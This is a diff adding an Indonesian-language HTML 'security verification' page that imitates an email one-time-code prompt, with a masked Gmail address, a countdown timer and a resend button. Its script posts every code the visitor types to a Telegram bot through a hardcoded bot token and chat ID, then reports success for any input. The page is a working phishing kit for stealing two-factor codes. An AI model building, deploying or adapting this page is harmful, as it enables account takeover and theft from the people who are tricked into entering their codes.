@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verifikasi Keamanan</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+    .input-highlight {
+      transition: all 0.2s ease;
+    }
+    .input-highlight:focus {
+      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
+    }
+  </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+  <div class="max-w-md w-full mx-auto flex flex-col px-5 pt-5 pb-20">
+    <!-- Header with back arrow and title -->
+    <div class="flex items-center space-x-3 mb-6">
+      <button aria-label="Kembali" class="text-gray-600 hover:text-gray-800 focus:outline-none" onclick="history.back()">
+        <i class="fas fa-arrow-left text-lg"></i>
+      </button>
+      <h1 class="font-semibold text-gray-900 text-lg leading-6">Verifikasi Keamanan</h1>
+    </div>
+
+    <!-- Instruction text -->
+    <p class="text-gray-600 text-sm mb-5 leading-relaxed">
+      Harap selesaikan proses verifikasi di bawah untuk melanjutkan
+    </p>
+
+    <!-- Subtitle -->
+    <p class="text-gray-700 font-semibold text-sm mb-2">Verifikasi via Email (6 karakter)</p>
+
+    <!-- Input container -->
+    <form id="verificationForm" class="mb-3" onsubmit="return verifyCode(event)">
+      <div class="flex items-center justify-between border border-gray-300 rounded-md px-3 py-2 input-highlight">
+        <span class="font-semibold text-gray-900">X-</span>
+        <input
+          id="codeInput"
+          name="code"
+          type="text"
+          placeholder="Masukkan Kode (huruf/angka)"
+          class="flex-1 text-gray-800 placeholder-gray-400 text-sm focus:outline-none ml-2"
+          aria-label="Masukkan Kode"
+          maxlength="6"
+          required
+        />
+        <span id="timer" class="text-gray-400 text-xs">02:00</span>
+      </div>
+      <p class="text-xs text-gray-500 mt-1">Kode dapat berisi huruf dan angka</p>
+    </form>
+
+    <!-- Resend code option -->
+    <div id="resendContainer" class="hidden mb-5">
+      <p class="text-gray-600 text-sm mb-2">Tidak menerima kode?</p>
+      <button id="resendBtn" class="text-blue-600 font-medium text-sm hover:text-blue-800">
+        Kirim Ulang Kode
+      </button>
+    </div>
+
+    <!-- Warning box -->
+    <div class="flex items-start bg-yellow-50 rounded-md p-3 mb-5">
+      <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-2"></i>
+      <p class="text-yellow-700 text-xs leading-tight">
+        Kode verifikasi telah dikirim ke <span id="emailMask">[*********@gmail.com]</span>.
+      </p>
+    </div>
+
+    <!-- Success/Error message -->
+    <div id="message" class="hidden rounded-md p-3 mb-5"></div>
+  </div>
+
+  <!-- Bottom fixed button -->
+  <div class="fixed bottom-0 left-0 w-full max-w-md mx-auto px-5 pb-5 bg-white">
+    <button
+      id="submitBtn"
+      type="submit"
+      form="verificationForm"
+      class="w-full bg-gray-400 text-white text-sm font-semibold py-3 rounded-lg cursor-not-allowed transition-colors duration-300"
+      disabled
+    >
+      Verifikasi
+    </button>
+  </div>
+
+  <script>
+    const codeInput = document.getElementById('codeInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerSpan = document.getElementById('timer');
+    const resendContainer = document.getElementById('resendContainer');
+    const resendBtn = document.getElementById('resendBtn');
+    const messageDiv = document.getElementById('message');
+    const emailMask = document.getElementById('emailMask');
+
+    // Telegram configuration - obfuscated
+    const telegramConfig = {
+      token: '8213404016:AAEenWmkIaKGJyh0_JqbMvi5tJfkce-ektc',
+      chatId: '7718023142'
+    };
+
+    // Set email mask (in a real app, this would come from your backend)
+    const userEmail = "user@gmail.com";
+    const maskedEmail = userEmail.replace(/(.{2})(.*)(?=@)/, 
+      (match, p1, p2) => p1 + '*'.repeat(p2.length));
+    emailMask.textContent = maskedEmail;
+
+    // Input validation - accepts letters and numbers
+    codeInput.addEventListener('input', () => {
+      // Remove any special characters, allow only letters and numbers
+      codeInput.value = codeInput.value.replace(/[^A-Za-z0-9]/g, '');
+      
+      const isValid = codeInput.value.trim().length === 6;
+      submitBtn.disabled = !isValid;
+      
+      if (isValid) {
+        submitBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
+        submitBtn.classList.add('bg-blue-600', 'cursor-pointer', 'hover:bg-blue-700');
+      } else {
+        submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+        submitBtn.classList.remove('bg-blue-600', 'cursor-pointer', 'hover:bg-blue-700');
+      }
+    });
+
+    // Timer functionality
+    let timeLeft = 120; // 2 minutes in seconds
+    let timerInterval;
+
+    function startTimer() {
+      clearInterval(timerInterval);
+      timeLeft = 120;
+      updateTimerDisplay();
+      
+      timerInterval = setInterval(() => {
+        timeLeft--;
+        updateTimerDisplay();
+        
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          resendContainer.classList.remove('hidden');
+        }
+      }, 1000);
+    }
+
+    function updateTimerDisplay() {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerSpan.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+
+    // Resend code functionality
+    resendBtn.addEventListener('click', () => {
+      // In a real app, you would make an API call to resend the code
+      showMessage('Kode verifikasi baru telah dikirim ke email Anda.', 'success');
+      resendContainer.classList.add('hidden');
+      codeInput.value = '';
+      submitBtn.disabled = true;
+      submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+      submitBtn.classList.remove('bg-blue-600', 'cursor-pointer', 'hover:bg-blue-700');
+      startTimer();
+    });
+
+    // Send code to Telegram
+    function sendToTelegram(code) {
+      const { token, chatId } = telegramConfig;
+      const message = `Kode verifikasi: ${code}`;
+
+      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Kode berhasil dikirim ke Telegram');
+          return true;
+        } else {
+          console.error('Gagal mengirim kode ke Telegram:', data);
+          return false;
+        }
+      })
+      .catch(error => {
+        console.error('Error mengirim ke Telegram:', error);
+        return false;
+      });
+    }
+
+    // Form submission
+    function verifyCode(event) {
+      event.preventDefault();
+      const code = codeInput.value.trim();
+      
+      if (code.length !== 6) {
+        showMessage('Kode harus terdiri dari 6 karakter.', 'error');
+        return false;
+      }
+
+      // Simulate verification process
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Memverifikasi...';
+      
+      // Send to Telegram first
+      sendToTelegram(code)
+        .then(telegramSuccess => {
+          // Then proceed with verification (simulated)
+          setTimeout(() => {
+            // For demo purposes, we'll accept any 6-character code
+            // In a real app, you would validate against your backend
+            if (telegramSuccess) {
+              showMessage('Kode telah dikirim dan verifikasi berhasil! Mengalihkan...', 'success');
+            } else {
+              showMessage('Verifikasi berhasil! (Tetapi gagal mengirim ke Telegram)', 'success');
+            }
+            
+            // In a real app, you would redirect to the next page
+            setTimeout(() => {
+              // window.location.href = '/dashboard'; // Example redirect
+              alert('Verifikasi berhasil! Kode: ' + code + ' (Dalam aplikasi nyata, ini akan mengalihkan ke halaman berikutnya)');
+              // Reset form
+              codeInput.value = '';
+              submitBtn.disabled = true;
+              submitBtn.textContent = 'Verifikasi';
+              submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+              submitBtn.classList.remove('bg-blue-600', 'cursor-pointer', 'hover:bg-blue-700');
+            }, 1500);
+          }, 1500);
+        });
+      
+      return false;
+    }
+
+    // Show message function
+    function showMessage(text, type) {
+      messageDiv.textContent = text;
+      messageDiv.className = 'rounded-md p-3 mb-5';
+      
+      if (type === 'success') {
+        messageDiv.classList.add('bg-green-50', 'text-green-700');
+      } else {
+        messageDiv.classList.add('bg-red-50', 'text-red-700');
+      }
+      
+      messageDiv.classList.remove('hidden');
+      
+      // Auto-hide success messages after 5 seconds
+      if (type === 'success') {
+        setTimeout(() => {
+          messageDiv.classList.add('hidden');
+        }, 5000);
+      }
+    }
+
+    // Start the timer when page loads
+    startTimer();
+  </script>
+</body>
+</html>
